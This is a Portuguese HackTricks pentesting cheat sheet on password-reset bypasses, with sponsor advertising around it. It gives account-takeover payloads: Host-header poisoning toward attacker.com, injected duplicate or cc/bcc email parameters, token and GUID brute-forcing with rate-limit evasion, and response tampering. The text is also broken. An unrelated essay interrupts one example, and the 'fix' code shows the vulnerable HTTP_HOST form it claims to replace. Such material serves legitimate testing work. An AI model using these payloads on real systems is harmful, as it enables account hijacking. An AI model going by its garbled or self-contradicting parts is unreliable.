# Bypass de Redefini√ß√£o/Esquecimento de Senha

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof √© o lar de todas as recompensas por bugs de criptografia.**

**Seja recompensado sem atrasos**\
As recompensas do HackenProof s√£o lan√ßadas apenas quando os clientes depositam o or√ßamento de recompensa. Voc√™ receber√° a recompensa ap√≥s a verifica√ß√£o do bug.

**Adquira experi√™ncia em pentesting web3**\
Protocolos de blockchain e contratos inteligentes s√£o a nova Internet! Domine a seguran√ßa web3 em seus dias de ascens√£o.

**Torne-se a lenda do hacker web3**\
Ganhe pontos de reputa√ß√£o com cada bug verificado e conquiste o topo do leaderboard semanal.

[**Cadastre-se no HackenProof**](https://hackenproof.com/register) e comece a ganhar com seus hacks!

{% embed url="https://hackenproof.com/register" %}

As seguintes t√©cnicas de recomposi√ß√£o foram retiradas de [https://anugrahsr.github.io/posts/10-Password-reset-flaws/](https://anugrahsr.github.io/posts/10-Password-reset-flaws/)

## Vazamento de Token de Redefini√ß√£o de Senha via Referer

O **referer HTTP** √© um campo de cabe√ßalho HTTP opcional que identifica o endere√ßo da p√°gina da web que est√° vinculada ao recurso solicitado. O cabe√ßalho de solicita√ß√£o Referer cont√©m o endere√ßo da p√°gina da web anterior a partir da qual um link para a p√°gina atualmente solicitada foi seguido.

![](https://www.optimizesmart.com/wp-content/uploads/2020/01/1-1-2.jpg)

### Explora√ß√£o

* Solicite a redefini√ß√£o de senha para o seu endere√ßo de e-mail
* Clique no link de redefini√ß√£o de senha
* N√£o altere a senha
* Clique em qualquer site de terceiros (por exemplo: Facebook, Twitter)
* Interceptar a solicita√ß√£o no proxy Burpsuite
* Verifique se o cabe√ßalho referer est√° vazando o token de redefini√ß√£o de senha.

### Impacto

Isso permite que a pessoa que tem controle sobre um determinado site altere a senha do usu√°rio (ataque CSRF), porque essa pessoa conhece o token de redefini√ß√£o de senha do usu√°rio.

### Refer√™ncia:

* https://hackerone.com/reports/342693
* https://hackerone.com/reports/272379
* https://hackerone.com/reports/737042
* https://medium.com/@rubiojhayz1234/toyotas-password-reset-token-and-email-address-leak-via-referer-header-b0ede6507c6a
* https://medium.com/@shahjerry33/password-reset-token-leak-via-referrer-2e622500c2c1

## Envenenamento de Redefini√ß√£o de Senha

Se voc√™ encontrar um ataque de cabe√ßalho de host e estiver fora do escopo, tente encontrar o bot√£o de redefini√ß√£o de senha!

![](https://portswigger.net/web-security/images/password-reset-poisoning.svg)

### Explora√ß√£o

* Interceptar a solicita√ß√£o de redefini√ß√£o de senha no Burpsuite
* Adicione o seguinte cabe√ßalho ou edite o cabe√ßalho no Burpsuite (tente um por um)
```
Host: attacker.com
```

```
Host: target.com
X-Forwarded-Host: attacker.com
```

```
Host: target.com
Host: attacker.com
```
* Verifique se o link para alterar a senha dentro do e-mail est√° apontando para attacker.com

### Corre√ß√£o

Use `$_SERVER['SERVER_NAME']` em vez de `$_SERVER['HTTP_HOST']`
```php
$resetPasswordURL = "https://{$_SERVER['HTTP_HOST']}/reset-password.php?token=12345678-1234-1234-1234-12345678901";
```
### Impacto

A v√≠tima receber√° o link malicioso em seu e-mail e, ao clicar nele, ir√° vazar o link / token de redefini√ß√£o de senha do usu√°rio para o atacante, resultando na tomada completa da conta.

### Refer√™ncia:

* https://hackerone.com/reports/226659
* https://hackerone.com/reports/167631
* https://www.acunetix.com/blog/articles/password-reset-poisoning/
* https://pethuraj.com/blog/how-i-earned-800-for-host-header-injection-vulnerability/
* https://medium.com/@swapmaurya20/password-reset-poisoning-leading-to-account-takeover-f178f5f1de87

## Redefini√ß√£o de Senha Manipulando o Par√¢metro de E-mail

### Explora√ß√£o

* Adicione o e-mail do atacante como segundo par√¢metro usando &
```php
POST /resetPassword
[...]
email=victim@email.com&email=attacker@email.com
```
* Adicione o email do atacante como segundo par√¢metro usando %20
```php
POST /resetPassword
[...]
email=victim@email.com%20email=attacker@email.com
```
* Adicione o email do atacante como segundo par√¢metro usando |
```php
POST /resetPassword
[...]
email=victim@email.com|email=attacker@email.com
```
* Adicione o email do atacante como segundo par√¢metro usando cc
```php
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
```
* Adicione o email do atacante como segundo par√¢metro usando bcc
```php
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"
```
* Adicione o email do atacante como segundo par√¢metro usando ,
```php
POST /resetPassword
[...]
email="victim@mail.tld",email="attacker@mail.tld"
```
* Adicione o email do atacante como segundo par√¢metro no array json
```php
POST /resetPassword
[...]
{"email":["victim@mail.tld","atracker@mail.tld"]}
```
### Refer√™ncia

* https://medium.com/@0xankush/readme-com-account-takeover-bugbounty-fulldisclosure-a36ddbe915be
* https://ninadmathpati.com/2019/08/17/how-i-was-able-to-earn-1000-with-just-10-minutes-of-bug-bounty/
* https://twitter.com/HusseiN98D/status/1254888748216655872

## Alterando o Email e a Senha de qualquer Usu√°rio atrav√©s dos Par√¢metros da API

### Explora√ß√£o

* O atacante deve fazer login em sua conta e ir para a fun√ß√£o de altera√ß√£o de senha
* Inicie o Burp Suite e intercepte a solicita√ß√£o
* Ap√≥s interceptar a solicita√ß√£o, envie-a para o repetidor e modifique os par√¢metros Email e Password
```php
POST /api/changepass
[...]
("form": {"email":"victim@email.tld","password":"12345678"})
```
### Refer√™ncia

* https://medium.com/@adeshkolte/full-account-takeover-changing-email-and-password-of-any-user-through-api-parameters-3d527ab27240

### Sem limite de taxa: Bombardeio de e-mails <a href="#5-no-rate-limiting-email-bombing" id="5-no-rate-limiting-email-bombing"></a>

### Explora√ß√£o

* Inicie o Burp Suite e intercepte a solicita√ß√£o de redefini√ß√£o de senha
* Envie para o intruder
* Use uma carga nula

### Refer√™ncia

* https://hackerone.com/reports/280534
* https://hackerone.com/reports/794395

## Descubra como o Token de Redefini√ß√£o de Senha √© Gerado

Descubra o padr√£o do token de redefini√ß√£o de senha

![](https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSvCcLcUTksGbpygrJB4III5BTBYEzYQfKJyg\&usqp=CAU)

Se for

* Gerado com base no timestamp
* Gerado com base no ID do usu√°rio
* Gerado com base no e-mail do usu√°rio
* Gerado com base no nome e sobrenome
* Gerado com base na data de nascimento
* Gerado com base em criptografia

Use o Burp Sequencer para encontrar a aleatoriedade ou previsibilidade dos tokens.

## GUID Adivinh√°vel

Existem diferentes tipos de GUIDs:

* **Vers√£o 0:** Apenas visto no GUID nulo ("00000000-0000-0000-0000-000000000000").
* **Vers√£o 1:** O GUID √© gerado de maneira previs√≠vel com base em:
* O hor√°rio atual
* Uma "sequ√™ncia de rel√≥gio" gerada aleatoriamente que permanece constante entre os GUIDs durante o tempo de atividade do sistema gerador
* Um "ID de n√≥", que √© gerado com base no endere√ßo MAC do sistema, se estiver dispon√≠vel
* **Vers√£o 3:** O GUID √© gerado usando um hash MD5 de um nome e namespace fornecidos.
* **Vers√£o 4:** O GUID √© gerado aleatoriamente.
* **Vers√£o 5:** O GUID √© gerado usando um hash SHA1 de um nome e namespace fornecidos.

√â poss√≠vel dar uma olhada em um GUID e descobrir sua vers√£o, h√° uma pequena ferramenta para isso: [**guidtool**](https://github.com/intruder-io/guidtool)\*\*\*\*
```http
guidtool -i 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c
UUID version: 1
UUID time: 2021-11-17 17:52:18.141000
UUID timestamp: 138564643381410000
UUID node: 17547390002044
UUID MAC address: 0f:f5:91:f2:a3:7c
UUID clock sequence: 3426
```
Se a vers√£o utilizada para gerar um GUID de redefini√ß√£o de senha for a vers√£o 1, √© poss√≠vel realizar um ataque de for√ßa bruta nos GUIDs:
```http
guidtool 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c -t '2021-11-17 18:03:17' -p 10000
a34aca00-47d0-11ec-8d62-0ff591f2a37c
a34af110-47d0-11ec-8d62-0ff591f2a37c
```
### Refer√™ncias

* [https://www.intruder.io/research/in-guid-we-trust](https://www.intruder.io/research/in-guid-we-trust)

## Manipula√ß√£o de resposta: Substituir uma resposta ruim por uma boa

Procure por solicita√ß√µes e respostas como estas
```php
HTTP/1.1 401 Unauthorized
(‚Äúmessage‚Äù:‚Äùunsuccessful‚Äù,‚ÄùstatusCode:403,‚ÄùerrorDescription‚Äù:‚ÄùUnsuccessful‚Äù)
```
# Redefinir Senha

Quando um usu√°rio esquece sua senha, √© importante fornecer um mecanismo seguro para redefini-la. No entanto, se esse mecanismo n√£o for implementado corretamente, pode abrir brechas de seguran√ßa que podem ser exploradas por hackers.

## Verifica√ß√£o de E-mail

Uma abordagem comum para redefinir senhas √© enviar um e-mail para o endere√ßo associado √† conta do usu√°rio. Esse e-mail geralmente cont√©m um link exclusivo que permite ao usu√°rio redefinir sua senha.

Ao implementar essa funcionalidade, √© fundamental garantir que o link de redefini√ß√£o de senha seja v√°lido apenas por um per√≠odo limitado e que expire ap√≥s o uso. Isso evita que um link antigo seja usado por um invasor para redefinir a senha de um usu√°rio.

## Prote√ß√£o contra Ataques de For√ßa Bruta

Para evitar ataques de for√ßa bruta, √© recomend√°vel implementar medidas de prote√ß√£o, como limitar o n√∫mero de tentativas de redefini√ß√£o de senha em um determinado per√≠odo de tempo. Al√©m disso, √© importante usar mecanismos de autentica√ß√£o robustos, como CAPTCHA, para verificar se o solicitante √© um humano leg√≠timo.

## Vazamento de Informa√ß√µes

Ao lidar com solicita√ß√µes de redefini√ß√£o de senha, √© importante ter cuidado para n√£o revelar informa√ß√µes sens√≠veis. Por exemplo, se um usu√°rio inserir um endere√ßo de e-mail inv√°lido, a resposta n√£o deve indicar explicitamente que o endere√ßo de e-mail n√£o existe em seu sistema. Em vez disso, uma mensagem gen√©rica deve ser exibida para evitar vazamento de informa√ß√µes.

## Testando a Funcionalidade de Redefini√ß√£o de Senha

Durante um teste de penetra√ß√£o, √© essencial verificar se a funcionalidade de redefini√ß√£o de senha √© segura. Isso pode ser feito tentando explorar poss√≠veis vulnerabilidades, como links de redefini√ß√£o de senha que n√£o expiram ou n√£o s√£o exclusivos. Al√©m disso, √© importante verificar se as medidas de prote√ß√£o contra ataques de for√ßa bruta est√£o funcionando corretamente.

## Conclus√£o

A redefini√ß√£o de senha √© uma funcionalidade cr√≠tica em muitos sistemas. Ao implement√°-la, √© fundamental seguir as melhores pr√°ticas de seguran√ßa para garantir que os usu√°rios possam redefinir suas senhas de forma segura e que a funcionalidade n√£o seja explorada por hackers.
```php
HTTP/1.1 200 OK
(‚Äúmessage‚Äù:‚Äùsuccess‚Äù,‚ÄùstatusCode:200,‚ÄùerrorDescription‚Äù:‚ÄùSuccess‚Äù)
```
### Refer√™ncia

* https://medium.com/@innocenthacker/como-encontrei-o-bug-mais-cr√≠tico-em-um-evento-de-recompensa-por-bugs-ao-vivo-7a88b3aa97b3

### Usando Token Expirado <a href="#8-usando-token-expirado" id="8-usando-token-expirado"></a>

* Verifique se o token expirado pode ser reutilizado

### For√ßa Bruta no Token de Redefini√ß√£o de Senha <a href="#9-for√ßa-bruta-no-token-de-redefini√ß√£o-de-senha" id="9-for√ßa-bruta-no-token-de-redefini√ß√£o-de-senha"></a>

Tente realizar uma for√ßa bruta no token de redefini√ß√£o usando o Burpsuite
```php
POST /resetPassword
[...]
email=victim@email.com&code=$BRUTE$
```
* Use o IP-Rotator no burpsuite para contornar o limite de taxa baseado em IP.

### Refer√™ncia

* https://twitter.com/HusseiN98D/status/1254888748216655872/photo/1

### Tente Usar Seu Token <a href="#10-try-using-your-token" id="10-try-using-your-token"></a>

* Tente adicionar o token de redefini√ß√£o de senha com a conta da v√≠tima.
```php
POST /resetPassword
[...]
email=victim@email.com&code=$YOUR_TOKEN$
```
### Refer√™ncia

* https://twitter.com/HusseiN98D/status/1254888748216655872/photo/1

## Invalida√ß√£o de Sess√£o no Logout/Reset de Senha

Quando um usu√°rio faz logout ou reseta sua senha, a sess√£o atual deve ser invalidada.\
Portanto, capture os cookies enquanto o usu√°rio estiver logado, fa√ßa logout e verifique se os cookies ainda est√£o v√°lidos.\
Repita o processo alterando a senha em vez de fazer logout.

## Tempo de Expira√ß√£o do Token de Reset

Os tokens de reset devem ter um tempo de expira√ß√£o, ap√≥s o qual o token n√£o deve ser v√°lido para alterar a senha de um usu√°rio.

## Verifica√ß√µes Extras

* Use username@burp\_collab.net e analise o retorno de chamada
* Usu√°rio com c√≥pia oculta de e-mail=victim@mail.com%0a%0dcc:hacker@mail.com
* Senha longa (>200) causa DoS
* Acrescente um segundo par√¢metro de e-mail e valor

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof √© o lar de todas as recompensas por bugs de criptografia.**

**Seja recompensado sem atrasos**\
As recompensas do HackenProof s√£o lan√ßadas apenas quando os clientes depositam o or√ßamento de recompensa. Voc√™ receber√° a recompensa ap√≥s a verifica√ß√£o do bug.

**Adquira experi√™ncia em pentesting web3**\
Protocolos de blockchain e contratos inteligentes s√£o a nova Internet! Domine a seguran√ßa web3 em seus dias de ascens√£o.

**Torne-se uma lenda hacker web3**\
Ganhe pontos de reputa√ß√£o com cada bug verificado e conquiste o topo do leaderboard semanal.

[**Cadastre-se no HackenProof**](https://hackenproof.com/register) e comece a ganhar com seus hacks!

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Gostaria de ver sua **empresa anunciada no HackTricks**? Ou gostaria de ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo Telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
